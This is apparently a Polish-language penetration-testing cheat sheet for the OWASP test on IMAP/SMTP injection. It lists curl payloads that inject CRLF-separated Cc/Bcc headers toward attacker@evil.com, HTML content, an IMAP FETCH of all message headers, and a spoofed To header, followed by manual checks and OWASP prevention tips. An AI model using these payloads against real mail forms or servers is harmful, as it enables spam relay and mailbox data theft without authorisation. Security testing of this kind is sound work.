# WSTG-INPV-10 — Testing for IMAP SMTP Injection

## Cele

- Identify IMAP/SMTP injection points
- Understand the data flow and deployment structure of the system
- Assess the injection impacts

## KOMENDY

### SMTP Injection w formularzach kontaktowych

```bash
curl -X POST "https://TARGET/contact" -d "email=test@test.com%0ACc:attacker@evil.com&subject=test&body=test"
curl -X POST "https://TARGET/contact" -d "email=test@test.com%0ABcc:attacker@evil.com&subject=test&body=test"
curl -X POST "https://TARGET/contact" -d "email=test@test.com&subject=test%0AContent-Type: text/html%0A%0A<h1>injected</h1>&body=test"

```

### IMAP Injection

```bash
curl -s "https://TARGET/mail?mailbox=INBOX%0d%0aFETCH 1:* (BODY[HEADER])"

```

### Header injection

```bash
curl -X POST "https://TARGET/contact" -d "from=attacker%0ATo:victim@target.com&message=test"

```

## KOMENDY Z WORDLISTAMI

### fuzzdb SMTP injection (jesli istnieje)

```bash
# Referencja: Desktop/WSTG/fuzzdb-master/attack/email/

```

### Brak dedykowanych wordlist - test logiczny/manualny

```bash

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj formularze wysylajace emaile (kontakt, rejestracja, reset hasla)
2. Testuj wstrzykiwanie naglowkow SMTP (%0A, %0D%0A, \r\n)
3. Sprawdz czy mozna dodac Cc/Bcc/To do wiadomosci
4. Testuj IMAP komendy jesli aplikacja laczy sie z serwerem IMAP
5. Sprawdz czy email jest renderowany jako HTML (XSS via email)


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Injection_Prevention_Cheat_Sheet.md

- Waliduj i sanityzuj naglowki email — odrzuc input z CRLF (\r\n)
- Uzywaj bibliotek z wbudowana ochrona przed header injection
- Nie pozwalaj uzytkownikowi na kontrolowanie naglowkow From, To, CC, BCC
- Ogranicz dozwolone znaki w polach email do [a-zA-Z0-9@._-]

## ROZSZERZENIA BURP SUITE

Brak dedykowanych rozszerzen Burp dla tego testu.
